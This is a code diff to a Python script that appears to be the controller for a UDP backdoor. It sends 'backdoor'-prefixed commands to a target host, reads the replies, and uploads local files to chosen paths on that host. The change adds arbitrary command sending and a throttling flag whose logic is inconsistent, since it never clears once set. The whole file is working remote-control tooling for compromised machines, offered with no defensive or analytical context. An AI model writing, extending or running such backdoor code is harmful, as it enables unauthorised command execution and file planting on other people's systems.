@@ -2,8 +2,10 @@ import socket
 import random
 import os
 import threading
+import time
 
 file_offset = 0
+freeze = False
 
 def get_udp_socket(loc_port=random.randint(1024, 65535), timeout: int=1, use_ipv6: bool=False, loc_addr: str="") -> socket.socket:
     if not loc_port:
@@ -19,7 +21,7 @@ def get_udp_socket(loc_port=random.randint(1024, 65535), timeout: int=1, use_ipv
 
 def recv_msg(sk: socket.socket) -> str:
     try:
-        msg = sk.recvfrom(1600)[0].decode("gbk")[9:]
+        msg = sk.recvfrom(1600)[0].decode("gbk")
         if msg.startswith("backdoor "):
             return msg[9:]
         else:
@@ -28,18 +30,18 @@ def recv_msg(sk: socket.socket) -> str:
         return ""
 
 def upload_file_recv(sk: socket.socket, file):
-    global file_offset
+    global file_offset, freeze
     while True:
         msg = recv_msg(sk)
         if msg.startswith("set_offset"):
-            freeze = True
+            # freeze = True
             file.seek(int(msg[11:]))
             file_offset = int(msg[11:])
         elif msg.startswith("end"):
             break
 
 def upload_file(local_path: str, remote_path: str, sk: socket.socket, target: tuple[str, int]):
-    global file_offset
+    global file_offset, freeze
     if os.path.exists(local_path):
         file_size = os.path.getsize(local_path)
         file_info = f"{file_size.__str__().ljust(20)} {remote_path}"
@@ -62,6 +64,9 @@ def upload_file(local_path: str, remote_path: str, sk: socket.socket, target: tu
             t = threading.Thread(target=upload_file_recv, args=(sk, file), daemon=True)
             t.start()
             while data_size == 1500:
+                if freeze:
+                    time.sleep(0.5)
+                    freeze = True
                 if file_offset + data_size > file_size:
                     data_size = file_size - file_offset
                 file_data = file.read(data_size)
@@ -74,6 +79,7 @@ def upload_file(local_path: str, remote_path: str, sk: socket.socket, target: tu
         data = f"backdoor upload {'-2'.ljust(20)}\0".encode("gbk")
         sk.sendto(data, target)
         file_offset = 0
+    time.sleep(1)
 
 if __name__ == "__main__":
     sk = get_udp_socket()
@@ -100,4 +106,5 @@ if __name__ == "__main__":
             sk = get_udp_socket()
             upload_file(local_path, remote_path, sk, target)
 
+        sk.sendto(f"backdoor {cmd}\0".encode(), target)
         print(f"{recv_msg(sk)}")
